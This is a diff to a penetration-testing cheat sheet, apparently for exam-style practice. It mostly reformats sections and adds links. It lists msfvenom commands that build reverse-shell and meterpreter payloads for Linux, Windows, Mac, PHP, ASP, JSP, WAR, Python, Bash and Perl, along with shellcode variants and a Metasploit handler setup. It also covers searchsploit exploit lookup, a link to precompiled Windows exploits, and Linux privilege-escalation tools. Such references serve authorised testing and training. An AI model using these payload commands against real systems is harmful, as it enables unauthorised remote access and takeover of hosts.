@@ -43,11 +43,15 @@ Enumeration
 
 **4. Are there any exploits available publicly from the services discovered from Step 2?**
 ----------------------------------------------------------------------------------------------------------------------
-Searchsploit <service name>
+* searchsploit <service name>
 
-http://www.securityfocus.com/vulnerabilities
+* http://www.securityfocus.com/vulnerabilities
 
 Copy exploit to local dir: searchsploit -m <ID>
+   
+**Precompiled windows exploits - https://github.com/abatchy17/WindowsExploits**
+
+
 
 **5. Manual Poking for Web Pages**
 ----------------------------------------------------------------------------------------------------------------------
@@ -184,75 +188,75 @@ Use Wireshark / tcpdump to capture traffic on the target host:
 ----------------------------------------------------------------------------------------------------------------------
 Payload generation
 ----------------------------------------------------------------------------------------------------------------------
- List payloads
+ **List payloads**
 
 msfvenom -l
 
-Binaries
-
-Linux
+**Binaries:**
+----------------------------------------------------------------------------------------------------------------------
+**Linux**
 
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 
-Windows
+**Windows**
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 
-Mac
+**Mac**
 
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
 
-Web Payloads
-
-PHP
+**Web Payloads:**
+----------------------------------------------------------------------------------------------------------------------
+**PHP**
 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
-ASP
+**ASP**
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
 
-JSP
+**JSP**
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
 
-WAR
+**WAR**
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
 
-Scripting Payloads
-
-Python
+**Scripting Payloads**
+----------------------------------------------------------------------------------------------------------------------
+**Python**
 
 msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
 
-Bash
+**Bash**
 
 msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
 
-Perl
+**Perl**
 
 msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
 
-Shellcode
+**Shellcode**
 
 For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
 
-Linux Based Shellcode
+**Linux Based Shellcode**
 
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 
-Windows Based Shellcode
+**Windows Based Shellcode**
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 
-Mac Based Shellcode
+**Mac Based Shellcode**
 
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 
-Handlers
-
+**Handlers**
+----------------------------------------------------------------------------------------------------------------------
 Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
 
 use exploit/multi/handler
@@ -265,7 +269,26 @@ exploit -j -z
 Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
 
 
+----------------------------------------------------------------------------------------------------------------------
+Privilege Escalation
+----------------------------------------------------------------------------------------------------------------------
+**Windows:** 
 
+* http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation
+
+**Linux:**
+
+* LinEnum
+http://www.rebootuser.com/?p=1758
+This tool is great at running through a heap of things you should check on a Linux system in the post exploit process. This include file permissions, cron jobs if visible, weak credentials etc. The first thing I run on a newly compromised system.
+
+* LinuxPrivChecker
+http://www.securitysift.com/download/linuxprivchecker.py
+This is a great tool for once again checking a lot of standard things like file permissions etc. The real gem of this script is the recommended privilege escalation exploits given at the conclusion of the script. This is a great starting point for escalation.
+
+* g0tmi1k’s Blog
+http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+Not so much a script as a resource, g0tmi1k’s blog post here has led to so many privilege escalations on Linux system’s it’s not funny. Would definitely recommend trying out everything on this post for enumerating systems. 
 
 
 
